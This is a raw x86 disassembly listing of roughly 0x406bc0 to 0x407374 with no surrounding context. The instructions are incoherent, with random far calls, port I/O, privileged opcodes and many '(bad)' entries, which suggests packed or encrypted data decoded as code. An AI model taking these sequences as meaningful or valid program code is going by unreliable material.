  406bc0:	les    ecx,FWORD PTR [ebp+0x60]
  406bc3:	call   0x6f6f:0xae25d7da
  406bca:	pop    ss
  406bcb:	sbb    eax,0x658e7536
  406bd0:	mov    al,ds:0xc324c39a
  406bd5:	popf   
  406bd6:	pushf  
  406bd7:	ss inc ecx
  406bd9:	out    dx,eax
  406bda:	mov    al,0x62
  406bdc:	leave  
  406bdd:	inc    esi
  406bde:	mov    esi,0x5aa10077
  406be3:	xor    bh,BYTE PTR [edi-0xc8c79b2]
  406be9:	popa   
  406bea:	xchg   esp,esi
  406bec:	ret    0xbcdf
  406bef:	inc    edi
  406bf0:	push   ecx
  406bf1:	mov    dh,0x9a
  406bf3:	in     al,0x8d
  406bf5:	sub    eax,DWORD PTR [edi]
  406bf7:	mov    al,0x34
  406bf9:	add    al,BYTE PTR [ecx+0x52d42555]
  406bff:	test   BYTE PTR [esi],ch
  406c01:	sbb    dh,0xab
  406c04:	xchg   ebx,eax
  406c05:	clc    
  406c06:	push   eax
  406c07:	aas    
  406c08:	sbb    DWORD PTR [ebp-0x3f],ebp
  406c0b:	hlt    
  406c0c:	lahf   
  406c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c0e:	mov    dh,0xdb
  406c10:	xchg   ebp,eax
  406c11:	jb     0x406b9d
  406c13:	mov    ds:0xfb9ffdf,eax
  406c18:	mov    dl,BYTE PTR [ebx-0x6a72cb49]
  406c1e:	pop    esi
  406c1f:	arpl   WORD PTR [edx+ecx*2+0x72],si
  406c23:	pop    ecx
  406c24:	pop    edi
  406c26:	xchg   ecx,eax
  406c27:	pop    eax
  406c28:	fsubp  st(4),st
  406c2a:	inc    esi
  406c2b:	or     BYTE PTR [edx-0x23],dl
  406c2e:	test   BYTE PTR [esi+0x62],bh
  406c31:	sar    DWORD PTR [ebx+0x32311ad],cl
  406c37:	cmp    ebx,esp
  406c39:	daa    
  406c3a:	and    eax,0x1a952ee4
  406c3f:	mov    eax,ds:0xf96cbd4e
  406c44:	in     eax,0x12
  406c46:	test   BYTE PTR [ecx+ebp*4-0x11781877],al
  406c4d:	rcl    cl,1
  406c4f:	pop    eax
  406c50:	popa   
  406c51:	pop    ebp
  406c52:	(bad)  
  406c53:	popf   
  406c54:	shl    bl,0xb2
  406c57:	mov    eax,0xaf796561
  406c5c:	in     eax,dx
  406c5d:	repz xor eax,0xcc81798
  406c63:	ins    BYTE PTR es:[edi],dx
  406c64:	ins    BYTE PTR es:[edi],dx
  406c65:	mov    esi,0x4f9b2df2
  406c6a:	lock ror WORD PTR [ebx],1
  406c6e:	mov    al,0x59
  406c70:	loopne 0x406ca3
  406c72:	mov    ebx,0xb64d8156
  406c77:	ins    BYTE PTR es:[edi],dx
  406c78:	add    BYTE PTR [edx],0x4d
  406c7b:	ss or  eax,0xed846b58
  406c81:	push   cs
  406c82:	and    al,0x3
  406c84:	sub    eax,0x161135df
  406c89:	iret   
  406c8a:	retf   
  406c8b:	dec    edx
  406c8c:	sub    al,0x35
  406c8e:	fst    st(6)
  406c90:	sbb    BYTE PTR [ebp+0x586bcc04],bh
  406c96:	mov    cl,0x77
  406c98:	mov    cl,0xa6
  406c9a:	cdq    
  406c9b:	mov    ebx,DWORD PTR [edx-0x3d]
  406c9e:	push   edi
  406c9f:	dec    ebx
  406ca0:	and    cl,bh
  406ca2:	jg     0x406d00
  406ca4:	xchg   dl,bh
  406ca6:	add    edx,DWORD PTR [ecx*1-0x10849583]
  406cad:	xor    bl,BYTE PTR [ebx-0x2b]
  406cb0:	xor    eax,0x664ab737
  406cb5:	push   edx
  406cb6:	xor    DWORD PTR [edx+0x1e1e406],ebp
  406cbc:	cmp    ah,BYTE PTR [esi-0x7a]
  406cbf:	scas   eax,DWORD PTR es:[edi]
  406cc0:	sbb    eax,0xcc94ea5e
  406cc5:	and    ecx,esp
  406cc7:	aaa    
  406cc8:	mov    al,BYTE PTR [eax+ebp*2+0x34eceb77]
  406ccf:	push   edx
  406cd0:	jns    0x406d16
  406cd2:	hlt    
  406cd3:	sub    al,0xb7
  406cd5:	pop    ds
  406cd6:	clc    
  406cd7:	inc    ecx
  406cd8:	fidiv  DWORD PTR [eax]
  406cda:	xchg   esi,eax
  406cdb:	out    dx,eax
  406cdc:	xchg   edi,eax
  406cdd:	fild   DWORD PTR [ebp+0x626aea01]
  406ce3:	fucomip st,st(6)
  406ce5:	in     al,0x69
  406ce7:	je     0x406d04
  406ce9:	stc    
  406cea:	bswap  ebx
  406cec:	adc    BYTE PTR [ebx+0x17084ce3],ch
  406cf2:	pop    eax
  406cf3:	mov    ebp,0xf9543056
  406cf8:	or     al,BYTE PTR ds:0x6e041c74
  406cfe:	test   DWORD PTR [esi+0x17],ecx
  406d01:	dec    edi
  406d02:	nop
  406d03:	push   eax
  406d04:	pushf  
  406d05:	push   edi
  406d06:	xchg   ecx,eax
  406d07:	addr16 (bad) 
  406d09:	out    dx,al
  406d0a:	push   es
  406d0b:	call   0xb635:0xddf5e5a1
  406d12:	xor    eax,0xa8ec099b
  406d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d18:	xor    BYTE PTR [ebp-0x45],ch
  406d1b:	fcom   QWORD PTR [edi+eiz*1-0x5d]
  406d1f:	jecxz  0x406d80
  406d21:	retf   0x733c
  406d24:	fild   DWORD PTR [eax+ecx*2]
  406d27:	push   edx
  406d28:	fistp  WORD PTR [eax]
  406d2a:	daa    
  406d2b:	adc    BYTE PTR [edi+ebx*4],bh
  406d2e:	js     0x406cbc
  406d30:	fmul   st(2),st
  406d32:	ins    BYTE PTR es:[edi],dx
  406d33:	cmc    
  406d34:	add    eax,0x990222b5
  406d39:	out    dx,eax
  406d3a:	or     BYTE PTR [edi-0x357ec601],dh
  406d40:	stos   DWORD PTR es:[edi],eax
  406d41:	push   ebp
  406d42:	ss in  eax,0xa1
  406d45:	sub    BYTE PTR [edx-0x79],0x48
  406d49:	xor    eax,esp
  406d4b:	mov    dl,0xb8
  406d4d:	dec    ecx
  406d4e:	mov    esi,ecx
  406d50:	addr16 inc ebx
  406d52:	inc    edi
  406d53:	rcr    cl,1
  406d55:	push   ecx
  406d56:	dec    ebx
  406d57:	inc    edi
  406d58:	sbb    eax,DWORD PTR [esi+0x1885f0a4]
  406d5e:	pop    edx
  406d5f:	or     eax,0x50ed2bec
  406d64:	hlt    
  406d65:	hlt    
  406d66:	add    dh,BYTE PTR [ebp+0x3b]
  406d69:	rcl    BYTE PTR [ecx-0x40b5b8dc],cl
  406d6f:	sub    DWORD PTR [ecx],0x781caa5a
  406d75:	les    esi,FWORD PTR [ecx]
  406d77:	mov    edi,0x4eb84112
  406d7c:	gs jmp 0x406ddf
  406d7f:	xlat   BYTE PTR ds:[ebx]
  406d81:	repnz dec esi
  406d83:	ins    BYTE PTR es:[edi],dx
  406d84:	ret    0xc5f1
  406d87:	dec    esp
  406d88:	mov    al,ds:0xaf2f47af
  406d8d:	mov    ch,BYTE PTR [ebp-0x7e]
  406d90:	or     al,0x77
  406d92:	pop    es
  406d93:	rcl    edi,cl
  406d95:	or     eax,0x49b327d7
  406d9a:	pop    es
  406d9b:	push   ecx
  406d9c:	mov    ds:0x2a96ff57,al
  406da1:	dec    eax
  406da2:	mov    eax,ds:0x79c9ded0
  406da7:	dec    esp
  406da8:	lea    ebx,[esi+0x59]
  406dab:	jg     0x406d76
  406dad:	daa    
  406dae:	int3   
  406daf:	push   0xfffffff7
  406db1:	and    bh,BYTE PTR [ecx]
  406db3:	pop    ss
  406db4:	test   DWORD PTR [eax],esp
  406db6:	sahf   
  406db7:	xor    esp,DWORD PTR [esi]
  406db9:	das    
  406dba:	mov    al,0x3a
  406dbc:	push   cs
  406dbd:	or     esi,DWORD PTR [edx]
  406dbf:	(bad)  
  406dc1:	rcl    cl,1
  406dc3:	mov    edx,0x7496f070
  406dc8:	lods   eax,DWORD PTR ds:[esi]
  406dc9:	vunpckhps ymm3,ymm2,ymm0
  406dce:	scas   eax,DWORD PTR es:[edi]
  406dcf:	or     eax,0x954a748e
  406dd4:	inc    eax
  406dd5:	mov    fs,WORD PTR [edx+0x2bf7eac7]
  406ddb:	jnp    0x406df8
  406ddd:	mov    eax,0xd934ff19
  406de2:	gs jl  0x406de2
  406de5:	xor    al,0x70
  406de7:	lahf   
  406de8:	daa    
  406de9:	adc    BYTE PTR [ebx-0x21],ch
  406dec:	in     al,dx
  406ded:	pop    esi
  406dee:	inc    eax
  406def:	stc    
  406df0:	or     eax,0xa634e195
  406df5:	mov    cl,BYTE PTR [esi]
  406df7:	jecxz  0x406e4f
  406df9:	fiadd  DWORD PTR ds:0x493e12ad
  406dff:	push   ss
  406e00:	mov    ah,bl
  406e02:	mov    ch,BYTE PTR [esi]
  406e04:	add    eax,DWORD PTR [ecx-0x3a]
  406e07:	iret   
  406e08:	jecxz  0x406e24
  406e0a:	and    esp,ebx
  406e0c:	popf   
  406e0d:	dec    eax
  406e0e:	out    dx,eax
  406e0f:	push   es
  406e10:	ja     0x406e66
  406e12:	dec    edi
  406e13:	sbb    ch,ah
  406e15:	lods   al,BYTE PTR ds:[esi]
  406e16:	dec    ebx
  406e17:	retf   
  406e18:	das    
  406e19:	xor    DWORD PTR [esi],esi
  406e1b:	pop    eax
  406e1c:	lock xchg esi,eax
  406e1e:	and    al,0x29
  406e20:	pushf  
  406e21:	cdq    
  406e22:	mov    esi,0xa4fb1bd2
  406e27:	xor    DWORD PTR [ebx+eiz*2],edi
  406e2a:	jbe    0x406dd2
  406e2c:	push   es
  406e2d:	loopne 0x406dba
  406e2f:	jb     0x406e06
  406e31:	jo     0x406dfc
  406e33:	mov    esp,0x83fc2607
  406e38:	cmp    BYTE PTR [eax-0x69],0x5
  406e3c:	add    al,0x42
  406e3e:	xlat   BYTE PTR ds:[ebx]
  406e3f:	push   ebx
  406e40:	push   eax
  406e41:	aam    0x86
  406e43:	out    0x1d,eax
  406e45:	sbb    BYTE PTR [edx-0x569f6a91],0xe9
  406e4c:	lods   al,BYTE PTR ds:[esi]
  406e4d:	fdiv   st,st(0)
  406e4f:	ficom  DWORD PTR [ecx-0x37626121]
  406e55:	lods   al,BYTE PTR ds:[esi]
  406e56:	rol    DWORD PTR [ebx],0x17
  406e59:	scas   al,BYTE PTR es:[edi]
  406e5a:	or     eax,0xea3c1d4a
  406e5f:	out    dx,eax
  406e60:	cli    
  406e61:	test   BYTE PTR [edx-0x151169fe],bl
  406e67:	adc    al,0xf9
  406e69:	xchg   DWORD PTR [ecx+eiz*2-0x75],esp
  406e6d:	jle    0x406dff
  406e6f:	aad    0x35
  406e71:	jp     0x406e60
  406e73:	mov    esi,0xacaeaea6
  406e78:	xor    BYTE PTR [ebx+esi*4],ch
  406e7b:	inc    ebx
  406e7c:	and    eax,0x4634a5aa
  406e81:	out    dx,eax
  406e82:	or     ebp,0xf6d12bd9
  406e88:	xor    ecx,DWORD PTR [ebx+0x2ee0c1c3]
  406e8e:	pop    es
  406e8f:	retf   
  406e90:	pusha  
  406e91:	mov    ah,0xd2
  406e93:	jae    0x406e24
  406e95:	mov    bh,0xd5
  406e97:	mov    WORD PTR ds:0xb04c23a0,gs
  406e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e9e:	call   0x46ab:0xe38c6dbf
  406ea5:	push   ebx
  406ea6:	in     al,dx
  406ea7:	inc    edx
  406ea8:	dec    esi
  406ea9:	les    ebx,FWORD PTR [edi]
  406eab:	repnz pop edi
  406ead:	jg     0x406e89
  406eaf:	hlt    
  406eb0:	xchg   esp,eax
  406eb1:	lods   eax,DWORD PTR ds:[esi]
  406eb2:	dec    ebx
  406eb3:	stc    
  406eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eb5:	dec    ebp
  406eb6:	retf   
  406eb7:	mov    ah,0xa9
  406eb9:	add    dl,0x22
  406ebc:	sar    DWORD PTR [ecx],0x7e
  406ebf:	jge    0x406e41
  406ec1:	and    al,0xd
  406ec3:	fwait
  406ec4:	ja     0x406f22
  406ec6:	in     al,dx
  406ec7:	xchg   edi,eax
  406ec8:	sbb    BYTE PTR [edi],bh
  406eca:	idiv   BYTE PTR [ebp+0x1b17a14d]
  406ed0:	aam    0x28
  406ed2:	pop    esi
  406ed3:	neg    DWORD PTR [esi]
  406ed5:	and    cl,BYTE PTR [eax+0xc]
  406ed8:	lahf   
  406ed9:	xor    dl,dl
  406edb:	gs inc edi
  406edd:	inc    esi
  406ede:	dec    eax
  406edf:	outs   dx,BYTE PTR ds:[esi]
  406ee0:	lock push edi
  406ee2:	rcl    DWORD PTR [ebp+edi*8+0x7],0x3c
  406ee7:	(bad)  
  406ee8:	xor    ebx,ebx
  406eea:	inc    eax
  406eeb:	sub    ch,BYTE PTR [edx]
  406eed:	sbb    bl,BYTE PTR [ebx]
  406eef:	mov    cl,0x96
  406ef1:	mov    eax,ds:0xa26e9044
  406ef6:	add    al,ah
  406ef8:	jge    0x406f05
  406efa:	std    
  406efb:	and    al,0x89
  406efd:	into   
  406efe:	push   esp
  406eff:	aas    
  406f00:	lea    ebx,[edi]
  406f02:	mov    ebx,0x2775f89f
  406f07:	mov    ch,0xe6
  406f09:	pop    ebx
  406f0a:	xchg   ecx,eax
  406f0b:	jmp    0x406e9d
  406f0d:	sub    DWORD PTR [eax+eiz*8-0x455179b4],0xc9ef1d33
  406f18:	int3   
  406f19:	push   ecx
  406f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f1b:	xor    ecx,DWORD PTR [esi+0x7]
  406f1e:	test   al,0x29
  406f20:	jns    0x406f96
  406f22:	mov    bl,BYTE PTR [eax-0x9c04e5a]
  406f28:	mov    ch,0x12
  406f2a:	(bad)
  406f2e:	clc    
  406f2f:	push   ebp
  406f30:	fnstsw WORD PTR [eax+0x335acbd8]
  406f36:	xor    eax,esp
  406f38:	in     eax,dx
  406f39:	sbb    BYTE PTR [eax-0x37c59721],0xfc
  406f40:	ja     0x406edb
  406f42:	loope  0x406f72
  406f44:	shr    DWORD PTR ds:0x9fd01155,0xef
  406f4b:	test   eax,0xa2b9cb84
  406f50:	ret    0x8f56
  406f53:	pop    esp
  406f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f55:	mov    BYTE PTR ds:0xa008a669,bh
  406f5b:	retf   0xab29
  406f5e:	fiadd  WORD PTR [edi+0x4389574d]
  406f64:	cmp    al,0xc3
  406f66:	sub    al,0x8c
  406f68:	dec    eax
  406f69:	inc    di
  406f6b:	xchg   ebx,eax
  406f6c:	push   ebx
  406f6d:	pop    ds
  406f6e:	fisttp QWORD PTR [esi]
  406f70:	or     BYTE PTR [edi],bh
  406f72:	mov    ds:0x2d061cfd,eax
  406f77:	jle    0x406f27
  406f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f7a:	out    dx,al
  406f7b:	iret   
  406f7c:	push   0x6c9d9910
  406f81:	test   al,0x8e
  406f83:	ins    DWORD PTR es:[edi],dx
  406f84:	xchg   edi,eax
  406f85:	mov    ebp,0x5a5833d1
  406f8a:	repnz or eax,0xc5ea00c4
  406f90:	jne    0x406f42
  406f92:	les    eax,FWORD PTR [edi+0x78642547]
  406f98:	push   esi
  406f99:	sbb    DWORD PTR [edi],ebp
  406f9b:	pop    ss
  406f9c:	mov    ch,0x7f
  406f9e:	push   ss
  406f9f:	mov    bl,0x9f
  406fa1:	jne    0x406fd9
  406fa3:	fisttp QWORD PTR [ecx-0x35]
  406fa6:	and    al,0x71
  406fa8:	push   ecx
  406fa9:	idiv   DWORD PTR [ebx+0x1121d3fb]
  406faf:	aam    0xab
  406fb1:	jl     0x406f91
  406fb3:	pop    ss
  406fb4:	mov    ecx,0xefb1c69c
  406fb9:	(bad)  
  406fba:	pop    ds
  406fbb:	scas   al,BYTE PTR es:[edi]
  406fbc:	daa    
  406fbd:	push   0x50
  406fbf:	in     al,0x82
  406fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc2:	bound  esp,QWORD PTR [ebp+eax*4+0x4b79f9c3]
  406fc9:	into   
  406fca:	sbb    eax,0xbcdf0aa6
  406fcf:	xor    bh,BYTE PTR [ecx-0x1ef788ef]
  406fd5:	loopne 0x406ffc
  406fd7:	cmp    BYTE PTR [edi+ebx*2-0x734eb816],dh
  406fde:	fdivrp st(0),st
  406fe0:	adc    BYTE PTR [ebx-0x46888a78],ah
  406fe6:	(bad)  
  406fe7:	test   eax,0x75237456
  406fec:	xor    DWORD PTR [ecx-0x519bad22],esp
  406ff2:	test   DWORD PTR [ebp+edi*4-0x54],ebp
  406ff6:	pop    es
  406ff7:	loope  0x407034
  406ff9:	ds stc 
  406ffb:	sbb    al,0x85
  406ffd:	nop
  406ffe:	(bad)  
  406fff:	call   DWORD PTR [edx+0x57]
  407002:	sbb    ebp,DWORD PTR [ecx+esi*1+0x5b]
  407006:	lods   eax,DWORD PTR ds:[esi]
  407007:	ins    BYTE PTR es:[edi],dx
  407008:	or     edi,eax
  40700a:	mov    eax,0x1720eeba
  40700f:	or     eax,0x93b83209
  407014:	mov    bl,0x96
  407016:	mov    ss:0x63ecbb46,eax
  40701c:	dec    ebx
  40701d:	arpl   cx,si
  40701f:	bound  ebx,QWORD PTR [esp+eax*4]
  407022:	jo     0x407047
  407024:	jle    0x407050
  407026:	sub    esi,DWORD PTR [eax-0x5b]
  407029:	mov    ch,0x45
  40702b:	aas    
  40702c:	push   ecx
  40702d:	imul   esp,DWORD PTR [ecx*1-0x6de49d26],0x220717de
  407038:	push   edx
  407039:	test   eax,0x1bb5b554
  40703e:	xchg   esp,eax
  40703f:	xor    al,0xf8
  407041:	sbb    cl,bh
  407043:	xchg   ebx,eax
  407044:	ret    0xdba4
  407047:	scas   al,BYTE PTR es:[edi]
  407048:	or     DWORD PTR [esi+0x166f16cb],ecx
  40704e:	push   edi
  40704f:	ret    0x7eb5
  407052:	test   DWORD PTR [edi-0x70f8fd8a],esi
  407058:	mov    eax,ds:0x8c4c9423
  40705d:	retf   0xc0f9
  407060:	imul   edx,DWORD PTR [edx-0x77],0xffffffcc
  407064:	pop    esp
  407065:	cmp    BYTE PTR [edx],0x30
  407068:	pop    edi
  407069:	pop    ss
  40706a:	adc    eax,0xb017b45a
  40706f:	(bad)  
  407070:	in     eax,0xa0
  407072:	adc    edi,esp
  407074:	(bad)  
  407076:	test   ebx,ebp
  407078:	jecxz  0x4070a8
  40707a:	stc    
  40707b:	or     eax,DWORD PTR [esi+eax*1+0x50e0292a]
  407082:	add    esi,DWORD PTR ds:0x1714f16a
  407088:	and    al,0xe
  40708a:	mov    dl,0x4f
  40708c:	dec    esi
  40708d:	pop    esp
  40708e:	retf   0xb3ea
  407091:	sbb    bh,bl
  407093:	outs   dx,BYTE PTR ds:[esi]
  407094:	mov    ah,0x1b
  407096:	push   eax
  407097:	push   cs
  407098:	xlat   BYTE PTR ds:[ebx]
  407099:	jmp    0xbf867a4a
  40709e:	or     BYTE PTR [ebp+eax*1-0x77cc4997],0x84
  4070a6:	fsubrp st(5),st
  4070a8:	jae    0x407124
  4070aa:	push   cs
  4070ab:	add    al,BYTE PTR [edx+edx*1+0x171b1c1f]
  4070b2:	in     eax,dx
  4070b3:	mov    esp,0x6a4900f0
  4070b8:	inc    edi
  4070b9:	adc    al,0xdc
  4070bb:	xchg   ebx,eax
  4070bc:	xchg   ebp,eax
  4070bd:	sbb    edi,ebp
  4070bf:	fdivr  st,st(2)
  4070c1:	xor    dh,BYTE PTR [ebx+0xe]
  4070c4:	mov    eax,db1
  4070c7:	or     bh,BYTE PTR [esi-0x2c]
  4070ca:	test   eax,0x64ea7268
  4070cf:	jns    0x4070ba
  4070d1:	adc    dl,al
  4070d3:	inc    edi
  4070d4:	dec    ebp
  4070d5:	inc    esi
  4070d6:	xchg   ebp,eax
  4070d7:	jmp    0x4070f2
  4070d9:	cmp    dh,bl
  4070db:	aam    0xf2
  4070dd:	or     BYTE PTR [eax+edi*2],ah
  4070e0:	je     0x407114
  4070e2:	xchg   ecx,eax
  4070e3:	mov    dh,0x77
  4070e5:	mov    ecx,DWORD PTR [ecx]
  4070e7:	pop    ebp
  4070e8:	mov    ss,eax
  4070ea:	pop    es
  4070eb:	retf   
  4070ec:	push   cs
  4070ed:	in     al,0xdd
  4070ef:	pop    ss
  4070f0:	xor    ah,BYTE PTR [edi+ebp*1+0x7cec1d3e]
  4070f7:	call   0x6afe:0xca16d273
  4070fe:	int    0x72
  407100:	shl    BYTE PTR [eax+edi*4],1
  407103:	jo     0x4070a4
  407105:	ss inc edx
  407107:	jp     0x40714b
  407109:	ss add al,0xa9
  40710c:	dec    esi
  40710d:	fstp   DWORD PTR [edi]
  40710f:	test   eax,0x6661187e
  407114:	dec    ebp
  407115:	dec    ecx
  407116:	dec    edi
  407117:	push   cs
  407118:	mov    bh,0x54
  40711a:	cmc    
  40711b:	push   ds
  40711c:	xor    al,0xce
  40711e:	cmp    eax,0x9e81005e
  407123:	ret    
  407124:	add    al,BYTE PTR [ebp+0x6f]
  407127:	dec    ebp
  407128:	xchg   ecx,eax
  407129:	jbe    0x407158
  40712b:	outs   dx,DWORD PTR ds:[esi]
  40712c:	repz mov gs,WORD PTR [ecx+0x5e]
  407130:	mov    esi,0x970b264e
  407135:	cmp    DWORD PTR [ebp+0x9],eax
  407138:	mov    al,ah
  40713a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40713b:	ret    
  40713c:	sbb    DWORD PTR [esi-0xb],esi
  40713f:	fidivr DWORD PTR [esi+0x16]
  407142:	retf   
  407143:	js     0x407178
  407145:	clc    
  407146:	jge    0x4070f5
  407148:	mov    fs,WORD PTR [edi+0x3e]
  40714b:	jae    0x4070e9
  40714d:	sub    al,0x1e
  40714f:	addr16 mov ecx,0xd93d40f
  407155:	sbb    DWORD PTR [edi+0x1f10ac23],edx
  40715b:	enter  0x1a47,0xdd
  40715f:	loope  0x40711d
  407161:	xchg   ecx,ecx
  407163:	mov    ds:0x15930ad0,al
  407168:	mov    edi,0xa7a99483
  40716d:	sbb    DWORD PTR [ebx],ebx
  40716f:	cdq    
  407170:	aas    
  407171:	stos   DWORD PTR es:[edi],eax
  407172:	dec    ecx
  407173:	test   BYTE PTR [eax+0x3f93f950],0x9c
  40717a:	adc    al,0x70
  40717c:	gs mov ah,0x1a
  40717f:	fwait
  407180:	stos   DWORD PTR es:[edi],eax
  407181:	jb     0x407187
  407183:	adc    DWORD PTR [edx-0x30b57968],eax
  407189:	mov    al,ds:0x8cb59fb1
  40718e:	repnz (bad) 
  407190:	xor    eax,0x6bc1d5b9
  407195:	scas   al,BYTE PTR es:[edi]
  407196:	xchg   esi,eax
  407197:	jmp    0xbd0d:0xead6d383
  40719e:	je     0x4071cb
  4071a0:	scas   eax,DWORD PTR es:[edi]
  4071a1:	call   0xdf4f6423
  4071a6:	imul   DWORD PTR [edi-0x16]
  4071a9:	jb     0x40717d
  4071ab:	stc    
  4071ac:	pop    edx
  4071ad:	pop    edi
  4071ae:	mov    ecx,0x6ba5451c
  4071b3:	in     al,dx
  4071b4:	xor    al,0x60
  4071b6:	test   al,0xfb
  4071b8:	jb     0x4071af
  4071ba:	pop    es
  4071bb:	xor    esp,edx
  4071bd:	add    eax,0x9cb6a439
  4071c2:	cld    
  4071c3:	ret    0x901b
  4071c6:	inc    ebp
  4071c7:	fmul   st(5),st
  4071c9:	sbb    al,0x6c
  4071cb:	ror    DWORD PTR [ecx+0x42bc610e],cl
  4071d1:	adc    eax,0xd474c158
  4071d6:	mov    ah,0x16
  4071d8:	fld    QWORD PTR [ebp*1-0x4582bafe]
  4071df:	jp     0xefe10a44
  4071e5:	mov    ebx,0x57bd902c
  4071ea:	lahf   
  4071eb:	lds    eax,FWORD PTR [ecx-0x2850e55e]
  4071f1:	mov    ch,0xb7
  4071f3:	and    eax,0xadb359b6
  4071f8:	sbb    DWORD PTR [eax+0x6d1672e5],esi
  4071fe:	icebp  
  4071ff:	data16 and al,0xa9
  407202:	push   eax
  407203:	fs mov esp,0x432690d0
  407209:	push   esp
  40720a:	test   BYTE PTR [edx-0x2a55dfda],cl
  407210:	icebp  
  407211:	ins    BYTE PTR es:[edi],dx
  407212:	dec    esp
  407213:	pop    edx
  407214:	int3   
  407215:	mov    DWORD PTR [eax+0x8],ebp
  407218:	pop    esi
  407219:	aaa    
  40721a:	rcl    BYTE PTR [eax+0x22886c64],1
  407220:	pop    ebp
  407221:	cmc    
  407222:	dec    esp
  407223:	push   edi
  407224:	jmp    0x51e1:0xa99126cb
  40722b:	fisttp WORD PTR [ebp+0x6f54cbf1]
  407231:	sub    edi,DWORD PTR [ecx+eax*4]
  407234:	pop    esi
  407235:	push   0xffffff94
  407237:	jl     0x407202
  407239:	fisttp QWORD PTR [esi]
  40723b:	sbb    BYTE PTR [eax+eax*1-0x7],ch
  40723f:	jge    0x40723e
  407241:	dec    edx
  407242:	mov    eax,0xda9a4921
  407247:	jp     0x407283
  407249:	push   esi
  40724a:	or     eax,0xb92300c2
  40724f:	adc    dl,BYTE PTR [eax-0x6a]
  407252:	call   0x66fe5bf4
  407257:	leave  
  407258:	mov    ebx,0xa56a32a1
  40725d:	push   esi
  40725e:	jp     0x4071e8
  407260:	dec    esi
  407261:	sbb    al,dl
  407263:	ss add ch,dl
  407266:	and    dl,bl
  407268:	xchg   edx,eax
  407269:	inc    esp
  40726a:	retf   
  40726b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40726c:	(bad)  
  40726d:	pop    eax
  40726e:	mov    dh,0xb
  407270:	sbb    DWORD PTR [edi],eax
  407272:	ins    BYTE PTR es:[edi],dx
  407273:	int3   
  407274:	nop
  407275:	mov    esi,0x8b44ed36
  40727a:	sbb    cl,BYTE PTR [ecx-0x626f178c]
  407280:	sbb    eax,0x1b673168
  407285:	dec    edi
  407286:	sub    cl,BYTE PTR [ecx+edx*4+0x70147eb9]
  40728d:	je     0x407215
  40728f:	(bad)  [edi-0x38]
  407292:	jmp    0xcf4:0xb34be020
  407299:	xor    BYTE PTR [edi+0x131e4c1c],ch
  40729f:	inc    ecx
  4072a0:	dec    esp
  4072a1:	fild   QWORD PTR [ecx-0x5b1dfa7]
  4072a7:	push   eax
  4072a8:	outs   dx,BYTE PTR ds:[esi]
  4072a9:	or     BYTE PTR [edx+ebx*8],0xc0
  4072ad:	mov    ecx,0x60d5a978
  4072b2:	loope  0x4072da
  4072b4:	xor    bh,bl
  4072b6:	mov    edi,0x4442c393
  4072bb:	pop    ss
  4072bc:	adc    DWORD PTR [esi+0x1f36e9ce],esi
  4072c2:	fsub   DWORD PTR [eax+0x7d]
  4072c5:	stos   BYTE PTR es:[edi],al
  4072c6:	pop    eax
  4072c7:	adc    ebp,DWORD PTR [esi+0x29]
  4072ca:	(bad)  
  4072cb:	mov    dh,dl
  4072cd:	xlat   BYTE PTR ds:[ebx]
  4072ce:	jbe    0x407348
  4072d0:	(bad)  
  4072d1:	shr    cl,0xf4
  4072d4:	(bad)  
  4072d5:	push   eax
  4072d7:	ins    BYTE PTR es:[edi],dx
  4072d8:	or     esp,DWORD PTR [esi-0x12]
  4072db:	fcomp  QWORD PTR [ebx-0x53]
  4072de:	dec    eax
  4072df:	jp     0x407284
  4072e1:	pop    edi
  4072e2:	and    bl,bl
  4072e4:	nop
  4072e5:	(bad)  
  4072e6:	(bad)  
  4072e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e8:	ins    DWORD PTR es:[edi],dx
  4072e9:	ins    DWORD PTR es:[edi],dx
  4072ea:	addr16 and al,0x6f
  4072ed:	lods   eax,DWORD PTR ds:[esi]
  4072ee:	dec    edx
  4072ef:	outs   dx,DWORD PTR ds:[esi]
  4072f0:	and    edi,eax
  4072f2:	mov    ah,0x60
  4072f4:	cmp    ah,BYTE PTR [edx+ebp*2-0xd]
  4072f8:	or     bl,bh
  4072fa:	rol    DWORD PTR [eax-0x35c26f28],1
  407300:	int    0x56
  407302:	scas   eax,DWORD PTR es:[edi]
  407303:	jp     0x4072e3
  407305:	mov    edi,0xb19168c8
  40730a:	mov    ah,0xfe
  40730c:	push   es
  40730d:	test   cl,dh
  40730f:	xor    DWORD PTR [ebp-0x24afba91],ebp
  407315:	pop    esi
  407316:	add    DWORD PTR [ecx+0x4f],0x1f1e703c
  40731d:	dec    esp
  40731e:	dec    esi
  40731f:	psubsw mm6,QWORD PTR [ebx+0xebec7bd]
  407326:	ins    BYTE PTR es:[edi],dx
  407327:	outs   dx,DWORD PTR ds:[esi]
  407328:	jb     0x4072ce
  40732a:	(bad)  
  40732b:	and    dl,BYTE PTR [edx-0x1c]
  40732e:	xlat   BYTE PTR ds:[ebx]
  40732f:	sbb    al,0xd
  407331:	jnp    0x4072eb
  407333:	(bad)  
  407334:	arpl   WORD PTR [ebp-0x34d01a6e],bp
  40733a:	mov    ch,0x3d
  40733c:	outs   dx,BYTE PTR ds:[esi]
  40733d:	and    DWORD PTR [ebx-0x770f917],esp
  407343:	cdq    
  407344:	fs sbb eax,0xea69e049
  40734a:	xchg   esp,eax
  40734b:	dec    esi
  40734c:	in     eax,0x40
  40734e:	add    al,0x98
  407350:	data16 jne 0x40738b
  407353:	mov    eax,0x2766dc24
  407358:	and    dl,0xd9
  40735b:	sar    BYTE PTR [esi],1
  40735d:	in     eax,dx
  40735e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40735f:	int3   
  407360:	xchg   esp,eax
  407361:	repz fild DWORD PTR [ecx+0x4d04f082]
  407368:	mov    DWORD PTR [ecx-0x28b6c789],ecx
  40736e:	ins    DWORD PTR es:[edi],dx
  40736f:	cmp    eax,0x9a30ce1e
  407374:	outs   dx,BYTE PTR ds:[esi]
